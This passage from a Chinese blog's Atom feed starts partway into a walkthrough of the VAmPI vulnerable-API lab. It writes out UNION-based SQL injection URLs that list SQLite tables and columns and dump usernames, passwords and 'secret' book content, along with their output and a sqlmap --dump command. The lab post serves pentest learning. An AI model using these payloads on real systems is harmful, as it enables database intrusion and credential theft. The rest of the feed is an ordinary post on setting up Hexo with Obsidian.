http://127.0.0.1:5001/users/v1/1&#x27;%20UNION%20SELECT%201,group_concat(tbl_name),3,4,5%20FROM%20sqlite_master%20WHERE%20type=&#x27;table&#x27;%20--+</span></span><br><span class="line"></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;username&quot;</span><span class="punctuation">:</span> <span class="string">&quot;users,books&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;email&quot;</span><span class="punctuation">:</span> <span class="string">&quot;4&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h4 id="查字段"><a href="#查字段" class="headerlink" title="查字段"></a>查字段</h4><blockquote><p>注意, 这里 <code>pragma_table_info(&#39;users&#39;)</code> 用于获取指定表的列信息，其中<code>name</code>是列名的字段。</p></blockquote><p>查询 <code>users</code> 表所有字段</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:5001/users/v1/1&#x27; UNION SELECT 1,group_concat(name),3,4,5 FROM pragma_table_info(&#x27;users&#x27;) --+</span><br></pre></td></tr></table></figure><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;username&quot;</span><span class="punctuation">:</span> <span class="string">&quot;id,username,password,email,admin&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;email&quot;</span><span class="punctuation">:</span> <span class="string">&quot;4&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>查询 <code>books</code> 表所有字段</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:5001/users/v1/1&#x27; UNION SELECT 1,group_concat(name),3,4,5 FROM pragma_table_info(&#x27;books&#x27;) --+</span><br></pre></td></tr></table></figure><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;username&quot;</span><span class="punctuation">:</span> <span class="string">&quot;id,book_title,secret_content,user_id&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;email&quot;</span><span class="punctuation">:</span> <span class="string">&quot;4&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h4 id="查数据"><a href="#查数据" class="headerlink" title="查数据"></a>查数据</h4><p>查询 <code>users</code> 表下 <code>username</code> 和 <code>password</code> 字段的数据</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:5001/users/v1/1&#x27; UNION SELECT 1,group_concat(printf(&#x27;%s@%s&#x27;,username,password)),3,4,5 FROM &#x27;users&#x27; --+</span><br></pre></td></tr></table></figure><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;username&quot;</span><span class="punctuation">:</span> <span class="string">&quot;name1@pass1,name2@pass2,admin@pass1&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;email&quot;</span><span class="punctuation">:</span> <span class="string">&quot;4&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>查询 <code>books</code> 表下 <code>book_title</code> 和 <code>secret_content</code> 字段的数据</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:5001/users/v1/1&#x27; UNION SELECT 1,group_concat(printf(&#x27;%s@%s&#x27;,book_title,secret_content)),3,4,5 FROM &#x27;books&#x27; --+</span><br></pre></td></tr></table></figure><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;username&quot;</span><span class="punctuation">:</span> <span class="string">&quot;bookTitle19@secret for bookTitle19,bookTitle56@secret for bookTitle56,bookTitle8@secret for bookTitle8&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;email&quot;</span><span class="punctuation">:</span> <span class="string">&quot;4&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><blockquote><p>使用 <code>sqlmap</code> 对 URL 中的路径参数进行注入测试时, 可以使用星号 <code>*</code> 表示路径参数的位置, 使用 <code>sqlmap -u &quot;http://127.0.0.1:5001/users/v1/*&quot; --dump</code> 同样可以检索出数据库内所有的数据。</p></blockquote>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://github.com/erev0s/VAmPI&quot;&gt;VAmPI&lt;/a&gt; 是一个具有 OWASP Top 10 漏洞的 REST API 的程序, 可以通过一个开关来控制 API 是否易受攻击, 可以用于测试、学习、教学的目的。在 &lt;a href=&quot;https://erev0s.com/blog/vampi-vulnerable-api-security-testing/&quot;&gt;https://erev0s.com/blog/vampi-vulnerable-api-security-testing/&lt;/a&gt; 可以看到更加全面的介绍。&lt;/p&gt;</summary>
    
    
    
    <category term="sec" scheme="https://blog.uuki.moe/categories/sec/"/>
    
    
    <category term="Pentesting API" scheme="https://blog.uuki.moe/tags/Pentesting-API/"/>
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="https://blog.uuki.moe/2023/05/28/hello-world/"/>
    <id>https://blog.uuki.moe/2023/05/28/hello-world/</id>
    <published>2023-05-27T16:00:00.000Z</published>
    <updated>2023-05-28T12:49:15.000Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to my blog. 👋 这是第一个帖子, 记录了这个站点的诞生。</p><span id="more"></span><details blue><summary> TimeLog </summary>              <div class='content'>              <div class="timeline"><div class="timenode"><div class="meta"><p><p>2023-05-28</p></p></div><div class="body"><p>编辑文章, 发布博客 (<a href="https://uuki.blog.moe/">https://uuki.blog.moe</a>)</p></div></div><div class="timenode"><div class="meta"><p><p>2023-05-29</p></p></div><div class="body"><p>补充<a href="#2-%E9%9B%86%E6%88%90-Obsidian">集成 Obsidian</a> 部分内容</p></div></div><div class="timenode"><div class="meta"><p><p>2023-05-30</p></p></div><div class="body"><ol><li><p>关闭光标样式</p><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="string">...</span></span><br><span class="line"><span class="attr">custom_css:</span></span><br><span class="line"><span class="attr">cursor:</span></span><br><span class="line"><span class="attr">enable:</span> <span class="literal">false</span></span><br><span class="line"><span class="string">...</span></span><br></pre></td></tr></table></figure></li><li><p>关闭平滑滚动</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">...</span></span><br><span class="line"><span class="attr">scroll_smooth:</span> <span class="literal">false</span></span><br><span class="line"><span class="string">...</span></span><br></pre></td></tr></table></figure></li></ol></div></div></div>              </div>            </details><p><strong>常用链接</strong></p><ul><li>Volantis 主题文档: <a href="https://volantis.js.org/">https://volantis.js.org/</a></li></ul><h2 id="1-初始化-Hexo-blog"><a href="#1-初始化-Hexo-blog" class="headerlink" title="1. 初始化 Hexo blog"></a>1. 初始化 Hexo blog</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">## 初始化</span></span><br><span class="line"><span class="built_in">cd</span> ~/blog</span><br><span class="line">hexo init</span><br><span class="line">git init .</span><br><span class="line"></span><br><span class="line"><span class="comment">## 安装主题</span></span><br><span class="line"><span class="comment"># https://github.com/volantis-x/hexo-theme-volantis/</span></span><br><span class="line">git submodule add https://github.com/volantis-x/hexo-theme-volantis.git themes/volantis</span><br><span class="line"><span class="built_in">cp</span> themes/volantis/_config.yml ./_config.volantis.yml</span><br></pre></td></tr></table></figure><h3 id="修改主题配置文件"><a href="#修改主题配置文件" class="headerlink" title="修改主题配置文件"></a>修改主题配置文件</h3><figure class="highlight diff"><figcaption><span>_config.volantis.yml</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="addition">+ 131 - navbar: # 导航栏</span></span><br><span class="line"><span class="deletion">- 171 - cover: # 头图</span></span><br><span class="line"><span class="addition">+ 214 - pages: # 友链页面配置</span></span><br><span class="line"><span class="addition">+ 387 - comments: # 评论</span></span><br><span class="line"><span class="addition">+ 563 - sidebar: # 侧边栏</span></span><br><span class="line"><span class="addition">+ 728 - site_footer: # 页脚</span></span><br><span class="line"><span class="addition">+ 817 - plugins: # 插件</span></span><br><span class="line"><span class="addition">+ 1053 - rightmenus: # 右键菜单</span></span><br></pre></td></tr></table></figure><h3 id="安装拓展插件"><a href="#安装拓展插件" class="headerlink" title="安装拓展插件"></a>安装拓展插件</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">## 音乐播放器</span></span><br><span class="line"><span class="comment"># https://aplayer.js.org/#/zh-Hans/</span></span><br><span class="line">npm install aplayer --save</span><br><span class="line"></span><br><span class="line"><span class="comment">## Hexo 搜索</span></span><br><span class="line"><span class="comment"># https://github.com/alexbruno/hexo-generator-json-content</span></span><br><span class="line">npm install hexo-generator-json-content --save</span><br><span class="line"></span><br><span class="line"><span class="comment">## Highlight</span></span><br><span class="line"><span class="comment"># https://highlightjs.org/static/demo/</span></span><br><span class="line"><span class="comment"># https://www.jsdelivr.com/package/npm/@highlightjs/cdn-assets?path=styles&amp;tab=files</span></span><br><span class="line">暂时没有启用, 而是使用 Hexo 内置的 Highlight</span><br><span class="line"></span><br><span class="line"><span class="comment">## RSS</span></span><br><span class="line">npm install hexo-generator-feed --save</span><br><span class="line">本地文件 atom.xml 会存在乱码, 部署到远程就没问题了</span><br><span class="line"></span><br><span class="line"><span class="comment">## Deploy</span></span><br><span class="line"><span class="comment"># https://github.com/hexojs/hexo-deployer-git</span></span><br><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure><h3 id="元数据盒子"><a href="#元数据盒子" class="headerlink" title="元数据盒子"></a>元数据盒子</h3><p>各种首页的 Front-matter</p><figure class="highlight markdown"><figcaption><span>about/index.md</span></figcaption><table><tr><td class="code"><pre><span class="line">layout: docs</span><br><span class="line">index: true</span><br><span class="line">title: About</span><br><span class="line">top<span class="emphasis">_meta: false</span></span><br><span class="line"><span class="emphasis">bottom_</span>meta: false</span><br><span class="line">sidebar: []</span><br></pre></td></tr></table></figure><figure class="highlight markdown"><figcaption><span>categories/index.md</span></figcaption><table><tr><td class="code"><pre><span class="line">layout: category</span><br><span class="line">index: true</span><br><span class="line">title: Categories</span><br><span class="line">top<span class="emphasis">_meta: false</span></span><br><span class="line"><span class="emphasis">bottom_</span>meta: false</span><br><span class="line">sidebar: []</span><br></pre></td></tr></table></figure><figure class="highlight markdown"><figcaption><span>tags/index.md</span></figcaption><table><tr><td class="code"><pre><span class="line">layout: tag</span><br><span class="line">index: true</span><br><span class="line">title: Tags</span><br><span class="line">top<span class="emphasis">_meta: false</span></span><br><span class="line"><span class="emphasis">bottom_</span>meta: false</span><br><span class="line">sidebar: []</span><br></pre></td></tr></table></figure><figure class="highlight markdown"><figcaption><span>friends/index.md</span></figcaption><table><tr><td class="code"><pre><span class="line">layout: friends</span><br><span class="line">index: true</span><br><span class="line">title: Links</span><br><span class="line">top<span class="emphasis">_meta: false</span></span><br><span class="line"><span class="emphasis">bottom_</span>meta: false</span><br><span class="line">sidebar: []</span><br></pre></td></tr></table></figure><h2 id="2-集成-Obsidian"><a href="#2-集成-Obsidian" class="headerlink" title="2. 集成 Obsidian"></a>2. 集成 Obsidian</h2><p>注意, 使用 Obsidian 打开 hexo 博客根目录作为仓库, 而不是 <code>_posts</code> 或其他路径</p><h3 id="本地保存图片"><a href="#本地保存图片" class="headerlink" title="本地保存图片"></a>本地保存图片</h3><blockquote><p>Custom Attachment Location: <a href="https://github.com/RainCat1998/obsidian-custom-attachment-location">https://github.com/RainCat1998/obsidian-custom-attachment-location</a></p></blockquote><p>参考如下参数进行配置</p><ul><li>Location for New Attachments: <code>source/assets/$&#123;filename&#125;</code></li><li>Pasted Image Name: <code>image-$&#123;date&#125;</code></li><li>Date Format: <code>YYYYMMDD_HHmmssSSS</code></li><li>Automatically rename attachment folder: 打开</li><li>Automatically rename attachment files: 打开</li></ul><p>直接在 Obsidian 内粘贴图片即可自动将图片保存在本地, 文件路径对应为 <code>source/assets/Markdown文件名称/image-时间戳</code></p><p><img src="/../assets/hello-world/image-20230529_232911.png" class="lazyload" data-srcset="/../assets/hello-world/image-20230529_232911.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><h3 id="创建文章模板"><a href="#创建文章模板" class="headerlink" title="创建文章模板"></a>创建文章模板</h3><blockquote><p>Templater: <a href="https://silentvoid13.github.io/Templater/">https://silentvoid13.github.io/Templater/</a></p></blockquote><p><strong>创建模板文件</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~/blog</span><br><span class="line"><span class="built_in">mkdir</span> template</span><br></pre></td></tr></table></figure><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line"><span class="section">## template/post.md</span></span><br><span class="line">title: &lt;% tp.file.title %&gt;</span><br><span class="line">date: &lt;% tp.date.now(&quot;YYYY-MM-DD HH:mm:ss&quot;) %&gt;</span><br><span class="line">author: Yuuki</span><br><span class="line">updated: </span><br><span class="line">headimg: </span><br><span class="line">description: </span><br><span class="line">tags: [&lt;% tp.system.prompt(&quot;Tag&quot;, &quot;&quot;) %&gt;]</span><br><span class="line">categories: [&lt;% tp.system.prompt(&quot;Category&quot;, &quot;&quot;) %&gt;]</span><br><span class="line"></span><br><span class="line"><span class="section">## template/timeNow.md</span></span><br><span class="line">&lt;% tp.date.now(&quot;YYYY-MM-DD HH:mm:ss&quot;) %&gt;</span><br><span class="line"></span><br><span class="line"><span class="section">## template/title.md</span></span><br><span class="line">&lt;% tp.file.title %&gt;</span><br></pre></td></tr></table></figure><p><strong>修改配置文件</strong></p><ul><li>设置模板文件夹: <strong>General Settings</strong> -&gt; <strong>Template folder location</strong>: <code>template</code></li><li>勾选 <strong>Enable Folder Templates</strong>: 允许指定目录的文件在新建时自动调用模板</li><li>配置文件选择 <strong>Folder Templates</strong> -&gt; <strong>Add New</strong>: Folder&#x3D;<code>source/_posts</code>, Template&#x3D;<code>template/post.md</code> 指示 <code>_posts</code> 目录下的文件在新建时自动调用 <code>post.md</code> 模板文件</li></ul><h3 id="可视化管理文章"><a href="#可视化管理文章" class="headerlink" title="可视化管理文章"></a>可视化管理文章</h3><blockquote><p>MAKE.md <a href="https://github.com/Make-md/makemd">https://github.com/Make-md/makemd</a></p></blockquote><p>注意, 插件在管理文件源属性时将 tag 作为标签管理, 与 Hexo 冲突, 需要进入插件配置页面, 找到 <strong>Context</strong> -&gt; 取消勾选 Contexts</p><p>创建自定义空间 Archive 用于管理 <code>_posts</code> 目录下的所有文章</p><p><img src="/../assets/hello-world/image-20230528_184910.gif" class="lazyload" data-srcset="/../assets/hello-world/image-20230528_184910.gif" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>像是本篇文章的 Front-matter 原属性内包含的 <code>categories=dev</code> (分类) 和 <code>tags=blog</code> (标签), 都可以作为 MAKE.md 插件的分许一句, 在创建空间时, 选择 New Smart Space 可以实现对不同分类或不同标签的文章进行单独的管理。</p><p><img src="/../assets/hello-world/image-20230529_232655.png" class="lazyload" data-srcset="/../assets/hello-world/image-20230529_232655.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><h3 id="清理无用附件"><a href="#清理无用附件" class="headerlink" title="清理无用附件"></a>清理无用附件</h3><p>Plan A: 依赖于 <a href="https://github.com/Johnson0907/obsidian-file-cleaner">File Cleaner</a> 插件</p><p>因为这个插件默认检索全仓库, 需要多加一点规则避免删除有用的文件</p><p>在删除之后, 右上角会弹窗提示, 如果有意外情况记得在清空废纸篓之前手动检查</p><figure class="highlight text"><figcaption><span>Excluded Folders</span></figcaption><table><tr><td class="code"><pre><span class="line">node_modules/</span><br><span class="line">scaffolds/</span><br><span class="line">template/</span><br><span class="line">themes/</span><br></pre></td></tr></table></figure><p>Plan B: 使用 Find orphaned files and broken links 插件</p><p>Find orphaned files and broken links 是一个可以用于发现空文件, 没有链接的文件的插件。</p><p>配置要更加复杂, 我也没有采用这种方案</p><h2 id="3-Hexo-半自动化部署"><a href="#3-Hexo-半自动化部署" class="headerlink" title="3. Hexo 半自动化部署"></a>3. Hexo 半自动化部署</h2><h3 id="半自动化脚本-Shell"><a href="#半自动化脚本-Shell" class="headerlink" title="半自动化脚本 (Shell)"></a>半自动化脚本 (Shell)</h3><p>基于 MacOS 操作系统</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./hexo status <span class="comment"># 判断运行状态</span></span><br><span class="line">./hexo restart <span class="comment"># 重新启动</span></span><br><span class="line">./hexo start <span class="comment"># 启动</span></span><br><span class="line">./hexo stop <span class="comment"># 停止</span></span><br><span class="line">./hexo deploy <span class="comment"># 部署至 GitHub</span></span><br></pre></td></tr></table></figure><p>编写 bash 脚本用于自动化操作 hexo</p><figure class="highlight bash"><figcaption><span>hexo.sh</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查 hexo 进程状态</span></span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">check_status</span></span>() &#123;</span><br><span class="line">    <span class="keyword">if</span> ps aux | grep hexo | grep -v grep | grep -v hexo.sh &gt;/dev/null; <span class="keyword">then</span></span><br><span class="line">        pid=$(ps aux | grep hexo | grep -v grep | grep -v hexo.sh | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span>)</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Hexo server is running [<span class="variable">$pid</span>]&quot;</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Hexo server is not running...&quot;</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 终止 hexo 进程</span></span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">stop_hexo</span></span>() &#123;</span><br><span class="line">    <span class="keyword">if</span> ps aux | grep hexo | grep -v grep | grep -v hexo.sh &gt;/dev/null; <span class="keyword">then</span></span><br><span class="line">        pid=$(ps aux | grep hexo | grep -v grep | grep -v hexo.sh | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span>)</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Hexo server is running [<span class="variable">$pid</span>]&quot;</span></span><br><span class="line">        <span class="built_in">kill</span> <span class="variable">$pid</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Hexo server is stoped...&quot;</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Hexo server is not running...&quot;</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 重启 hexo 进程</span></span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">restart_hexo</span></span>() &#123;</span><br><span class="line">    stop_hexo</span><br><span class="line">    start_hexo</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动 hexo 进程</span></span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">start_hexo</span></span>() &#123;</span><br><span class="line">    <span class="keyword">if</span> ps aux | grep hexo | grep -v grep | grep -v hexo.sh &gt;/dev/null; <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Hexo is running...&quot;</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        hexo server &amp;</span><br><span class="line">        pid=$(ps aux | grep hexo | grep -v grep | grep -v hexo.sh | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span>)</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Hexo is running... [<span class="variable">$pid</span>]&quot;</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 部署 hexo 到 GitHub</span></span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">deploy_hexo</span></span>() &#123;</span><br><span class="line">    hexo clean</span><br><span class="line">    hexo deploy</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 根据命令行参数执行对应的操作</span></span><br><span class="line"><span class="keyword">case</span> <span class="variable">$1</span> <span class="keyword">in</span></span><br><span class="line">    <span class="string">&quot;status&quot;</span>)</span><br><span class="line">        check_status</span><br><span class="line">        ;;</span><br><span class="line">    <span class="string">&quot;stop&quot;</span>)</span><br><span class="line">        stop_hexo</span><br><span class="line">        ;;</span><br><span class="line">    <span class="string">&quot;restart&quot;</span>)</span><br><span class="line">        restart_hexo</span><br><span class="line">        ;;</span><br><span class="line">    <span class="string">&quot;start&quot;</span>)</span><br><span class="line">        start_hexo</span><br><span class="line">        ;;</span><br><span class="line">    <span class="string">&quot;deploy&quot;</span>)</span><br><span class="line">        deploy_hexo</span><br><span class="line">        ;;</span><br><span class="line">    *)</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;使用方法: <span class="variable">$0</span> [status|stop|restart|start|deploy]&quot;</span></span><br><span class="line">        <span class="built_in">exit</span> 1</span><br><span class="line">        ;;</span><br><span class="line"><span class="keyword">esac</span></span><br></pre></td></tr></table></figure><h3 id="集成-Shell-command"><a href="#集成-Shell-command" class="headerlink" title="集成 Shell command"></a>集成 Shell command</h3><blockquote><p>依赖于 <a href="https://github.com/Taitava/obsidian-shellcommands">Shell command</a> 插件</p></blockquote><p>顶部导航栏选择 <strong>Environments</strong> 下方找到 <strong>Add directories to the PATH environment variable</strong>, 为 <code>hexo</code> 命令添加环境变量</p><p>Shell command 详细配置参考下面的图片 👇🏻</p><blockquote><p>这里需要将命令中顶部导航栏 <strong>Output</strong> -&gt; <strong>Output channel for stdout</strong> 设置为 Notification balloon</p></blockquote><p><img src="/../assets/hello-world/image-20230528_203843318.png" class="lazyload" data-srcset="/../assets/hello-world/image-20230528_203843318.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="><br><img src="/../assets/hello-world/image-20230528_203719961.png" class="lazyload" data-srcset="/../assets/hello-world/image-20230528_203719961.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>使用方法: Command + P 打开命令面板, 输入 hexo server, 回车后键入对应操作即可。也可以搭配 <a href="https://github.com/phibr0/obsidian-commander">Commander</a> 插件, 在左侧创建按钮更方便的管理。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;Welcome to my blog. 👋 这是第一个帖子, 记录了这个站点的诞生。&lt;/p&gt;</summary>
    
    
    
    <category term="dev" scheme="https://blog.uuki.moe/categories/dev/"/>
    
    
    <category term="blog" scheme="https://blog.uuki.moe/tags/blog/"/>
    
  </entry>
  
</feed>
